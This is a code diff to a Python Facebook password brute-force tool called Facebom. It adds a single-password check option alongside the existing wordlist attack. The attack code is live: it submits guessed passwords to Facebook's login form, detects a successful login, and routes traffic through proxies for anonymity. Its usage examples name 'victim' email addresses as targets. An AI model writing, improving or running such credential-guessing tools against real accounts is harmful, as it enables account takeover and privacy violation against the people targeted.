@@ -72,8 +72,9 @@ def ID(url):
         exit(1)
 
 #### Facebom Brute Force Function ####
-def FBOM(username, wordlist, proxy=None):
-    if not os.path.isfile(wordlist):
+def FBOM(username, wordlist, proxy=None,passwd=None):
+    if passwd==None:
+      if not os.path.isfile(wordlist):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
     if cnet() !=True:
@@ -101,10 +102,10 @@ def FBOM(username, wordlist, proxy=None):
                 print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
         else:
-            proxy,port = proxy.split(":")[0],proxy.split(":")[1]
+            proxy,port = proxy.split(":")
             if proxy.count(".") ==3:
-              if not port.isdigit() or int(port) <1 or int(port) > 65535:
-                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid  Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
+              if not port.isdigit() or int(port) <0 or int(port) > 65535:
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
                 exit(1)
               if cpro(proxy, port=port) == True:
                 print(wi+"["+gr+"Connected"+wi+"]")
@@ -131,7 +132,7 @@ def FBOM(username, wordlist, proxy=None):
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
 [>] Target      :> """+wi+username+gr+"""
-[>] Wordlist    :> """+yl+str(wordlist)+gr+"""
+{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if passwd==None else "[>] Password    :> "+yl+str(passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+gr+"""      
 =================================="""+wi+"""
 [~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
@@ -143,6 +144,38 @@ def FBOM(username, wordlist, proxy=None):
     if useproxy !=False : br.set_proxies({'https':useproxy, 'http':useproxy})
     br.addheaders=[('User-agent',useragent())]
     issuccess = 0
+    if passwd !=None:
+          if not passwd.strip() or len(passwd) <6:
+            print(yl+"\n["+rd+"!"+yl+"] Invalid Password [ "+rd+passwd+yl+" ]"+rd+" !!!"+wi)
+            exit(1)
+          passwd = passwd.strip()
+          try:
+            print(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
+            br.open("https://facebook.com")
+            br.select_form(nr=0)
+            br.form["email"]=username
+            br.form["pass"]=passwd
+            br.method="POST"
+            if br.submit().get_data().__contains__('home_icon'):
+              issuccess = 1
+              print(wi+"==> Login"+gr+" Success\n")
+              print(wi+"========================="+"="*len(passwd)+"======")
+              print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
+              print(wi+"========================="+"="*len(passwd)+"======")
+            else : print(yl+"==> Login"+rd+" Failed\n")
+          except(KeyboardInterrupt,EOFError):
+            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
+            time.sleep(1.5)
+            issuccess = 2
+          except Exception as e:
+            issuccess = 2
+            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+            time.sleep(0.60)
+
+          if issuccess==0:
+            print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
+            print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other password or Wordlist File "+gr+":)"+wi)          
+          exit(1)
     with open(wordlist) as wfile:
       for passwd in wfile:
         if not passwd.strip() or len(passwd.strip()) < 6: continue
@@ -166,19 +199,14 @@ def FBOM(username, wordlist, proxy=None):
         except (KeyboardInterrupt,EOFError):
           print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
           time.sleep(1.5)
-          wfile.close()
-          issuccess = 2
-          break
+          exit(1)
         except Exception as e:
-          issuccess = 2
-          print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+          print(rd+"["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
           time.sleep(0.60)
-          wfile.close()
-          break
+
     if issuccess ==0:
       print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
       print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
-    wfile.close()
     exit(1)
 
 parse = optparse.OptionParser(wi+"""
@@ -190,6 +218,8 @@ OPTIONS:
     | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
+    |--------
+    | -s <single password>                     ::> Specify Single Password To Check
     |--------
     | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
@@ -203,6 +233,8 @@ Examples:
      | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
      | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
+     |--------
+     | python facebom.py -t victim@gmail.com -s 1234567
      |-------- 
      | python facebom.py -g https://www.facebook.com/alanwalker97 
      |-------- 
@@ -212,6 +244,8 @@ def Main():
       help="Specify Target Email ")
    parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
       help="Specify Wordlist File ")
+   parse.add_option("-s","--singe","--S","--SINGLE",dest="single",type="string",
+      help="Specify Single Password To Check it")
    parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                         help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
    parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
@@ -222,7 +256,16 @@ def Main():
        wordlist = options.wlst
        proxy = options.proxy
        FBOM(username, wordlist, proxy=proxy)
-       
+   elif options.taremail !=None and options.single !=None and options.proxy !=None:
+       username = options.taremail
+       passwd = options.single
+       proxy = options.proxy
+       FBOM(username,"",passwd=passwd,proxy=proxy)
+   elif options.taremail !=None and options.single !=None:
+       username = options.taremail
+       passwd = options.single
+       FBOM(username,"",proxy=None,passwd=passwd)
+
    elif options.taremail !=None and options.wlst !=None:
        username = options.taremail
        wordlist = options.wlst
@@ -233,8 +276,10 @@ def Main():
    else:
        print(parse.usage)
        exit(1)
+
 if __name__=='__main__':
   Main()
+
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
